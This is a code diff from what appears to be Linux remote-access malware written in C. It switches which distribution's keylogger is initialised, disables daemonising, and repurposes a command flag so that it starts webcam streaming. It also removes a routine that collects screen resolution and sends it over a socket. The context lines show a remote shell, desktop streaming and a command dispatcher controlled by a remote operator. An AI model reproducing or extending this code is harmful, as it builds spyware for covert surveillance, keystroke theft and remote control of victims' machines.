@@ -71,13 +71,15 @@ int main(int argc, char*argv[])
         return 0;
     }
 
-    daemonize();
+
+
+    //daemonize();
 
     //ubuntu16_keylogger_init();
 
-    ubuntu18_keylogger_init();
+    //ubuntu18_keylogger_init();
 
-    //mint_keylogger_init();
+    mint_keylogger_init();
 
     //debian_keylogger_init();
 
@@ -120,7 +122,7 @@ void dispatch_modules(char *argv[])
     pthread_t thread_hosts_downloader = 0;
 
     pthread_t stream_desktop = 0;
-    pthread_t send_resolution = 0;
+    pthread_t stream_webcam_thread = 0;
 
 
     sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -344,15 +346,15 @@ void dispatch_modules(char *argv[])
 
         if(flag == 12)
         {
-            printf("\t\tSENDING RESOLUTION....\n");
+            printf("\t\tSTREAM THE WEBCAM....\n");
 
-            if(pthread_create(&send_resolution, NULL, (void*)get_remote_screen_resolution, NULL) == -1)
+            if(pthread_create(&stream_webcam_thread, NULL, (void*)execute_watch_cmd, NULL) == -1)
             {
-                error("pthread_create() get_remote_screen_resolution", "dispatch_modules()");
+                error("pthread_create() stream_webcam_thread", "dispatch_modules()");
                 exit(-1);
             }
 
-            if (pthread_join(send_resolution, NULL))
+            if (pthread_join(stream_webcam_thread, NULL))
             {
                 perror("pthread_join");
 
@@ -361,10 +363,12 @@ void dispatch_modules(char *argv[])
             //get_remote_screen_resolution();
         }
 
+
         if(flag == 13)
         {
             printf("\t\tSTREAMING STARTED....\n");
 
+            /** Call the thread that will execute the stream command
             if(pthread_create(&stream_desktop, NULL, (void*)execute_watch_cmd, NULL) == -1)
             {
                 error("pthread_create() execute_watch_cmd", "dispatch_modules()");
@@ -377,6 +381,8 @@ void dispatch_modules(char *argv[])
 
                 return;
             }
+            **/
+
         }
     }
 
@@ -860,56 +866,6 @@ void *start_remote_shell(char *argv[])
     pthread_exit(NULL);
 }
 
-
-void *get_remote_screen_resolution()
-{
-    FILE *screen_reso_pipe = NULL;
-    const gchar *reso_cmd = "xrandr --verbose | grep *current";
-    gchar buffer_screen_reso[62] = "";
-    char *final_resolution = NULL;
-    size_t final_reso_len = 0;
-
-    screen_reso_pipe = popen(reso_cmd, "r");
-    if(screen_reso_pipe == NULL)
-    {
-        error("popen() screen_reso_pipe", "uploaded_file()");
-        exit(-1);
-    }
-
-    if(fgets(buffer_screen_reso, 62, screen_reso_pipe) == NULL)
-    {
-        error("fgets() buffer_screen_reso", "uploaded_file()");
-        exit(-1);
-    }
-
-    final_resolution = split_resolution_cmds(buffer_screen_reso);
-
-    //printf("\n\nFinal cmds = %s\n\n", final_resolution);
-
-    final_reso_len = strlen(final_resolution) + 1;
-
-    if(send(csock, (char*)&final_reso_len, sizeof(final_reso_len), 0) == SOCKET_ERROR)
-    {
-        error("send() final_reso_len", "uploaded_file()");
-        exit(-1);
-    }
-
-    if(send(csock, final_resolution, final_reso_len, 0) == SOCKET_ERROR)
-    {
-        error("send() final_resolution", "uploaded_file()");
-        exit(-1);
-    }
-
-    clean_buffer(buffer_screen_reso);
-
-    free(final_resolution);
-
-    pclose(screen_reso_pipe);
-
-    //close(csock);
-
-    pthread_exit(NULL);
-}
 
 void execute_watch_cmd()
 {
